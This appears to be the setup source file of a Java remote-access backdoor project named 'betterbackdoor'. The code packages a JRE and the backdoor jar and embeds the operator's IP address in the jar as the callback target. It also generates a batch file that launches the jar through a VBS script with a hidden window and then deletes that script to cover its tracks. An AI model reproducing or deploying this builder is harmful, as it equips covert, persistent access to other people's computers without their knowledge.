package com.thatcherdev.betterbackdoor;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.Writer;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.nio.file.FileSystem;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.HashMap;
import java.util.Map;

import com.thatcherdev.betterbackdoor.backend.Utils;

import org.apache.commons.io.FileUtils;

public class Setup {

	/**
	 * Sets up backdoor.
	 * <p>
	 * If {@code packageJre} is true, copies the current machines JRE to directory
	 * 'backdoor' and {@code #createBat(String, String, String)} is used to create a
	 * '.bat' file for running the backdoor in the JRE. If {@code packageJre} is
	 * false but directory 'jre' containing a Windows JRE distribution exists, 'jre'
	 * is copied to 'backdoor' and {@code #createBat(String, String, String)} is
	 * used to create a '.bat' file for running the backdoor in the JRE. 'run.jar'
	 * is copied from 'target' to 'backdoor' and 'ip' is appended into it using
	 * {@code #appendJar(String, String, String)}. If {@code ipType} is "internal",
	 * 'ip' will contain the internal IP address of the current machine. Otherwise,
	 * if {@code ipType} is "external", 'ip' will contain the external IP address of
	 * the current machine.
	 * 
	 * @param packageJre if a JRE should be packaged with the backdoor
	 * @param ipType     type of IP address to append to 'run.jar'
	 * @throws IOException
	 */
	public static void create(boolean packageJre, String ipType) throws IOException {
		if (packageJre) {
			String jrePath = System.getProperty("java.home");
			FileUtils.copyDirectory(new File(jrePath + File.separator + "bin"),
					new File("backdoor" + File.separator + "jre" + File.separator + "bin"));
			FileUtils.copyDirectory(new File(jrePath + File.separator + "lib"),
					new File("backdoor" + File.separator + "jre" + File.separator + "lib"));
			createBat("backdoor" + File.separator + "run.bat");
		} else if (new File("jre").isDirectory()) {
			FileUtils.copyDirectory(new File("jre"), new File("backdoor" + File.separator + "jre"));
			createBat("backdoor" + File.separator + "run.bat");
		}
		FileUtils.copyFile(new File("target" + File.separator + "run.jar"),
				new File("backdoor" + File.separator + "run.jar"));
		appendJar("backdoor" + File.separator + "run.jar", "/ip", Utils.getIP(ipType));
	}

	/**
	 * Creates a '.bat' batch file for running a jar file in a Java Runtime
	 * Environment.
	 *
	 * @param filePath path of '.bat' batch file to create
	 * @throws FileNotFoundException
	 */
	private static void createBat(String filePath) throws FileNotFoundException {
		PrintWriter out = new PrintWriter(new File(filePath));
		out.println(
				"@echo off\n%~d0 & cd %~dp0\necho Set objShell = WScript.CreateObject(\"WScript.Shell\")>run.vbs\necho objShell.Run \"cmd /c "
						+ "jre\\bin\\java -jar run.jar\", ^0, True>>run.vbs\nstart run.vbs\ncall:delvbs\n:delvbs\nif exist run.vbs (\n timeout 3 > nul\n del run.vbs\n @exit\n"
						+ ") else (\ncall:delvbs\n)\ngoto:eof");
		out.flush();
		out.close();
	}

	/**
	 * Appends a new file with name {@code filename} and contents
	 * {@code fileContents} into existing jar file with name {@code jarFile}.
	 * 
	 * @param jarFile      name of jar file to append
	 * @param filename     name of new file to append in jar
	 * @param fileContents contents of new file to append in jar
	 * @throws IOException
	 */
	private static void appendJar(String jarFile, String filename, String fileContents) throws IOException {
		Map<String, String> env = new HashMap<>();
		env.put("create", "true");
		try (FileSystem fileSystem = FileSystems.newFileSystem(URI.create("jar:" + Paths.get(jarFile).toUri()), env)) {
			try (Writer writer = Files.newBufferedWriter(fileSystem.getPath(filename), StandardCharsets.UTF_8,
					StandardOpenOption.CREATE)) {
				writer.write(fileContents);
			}
		}
	}
}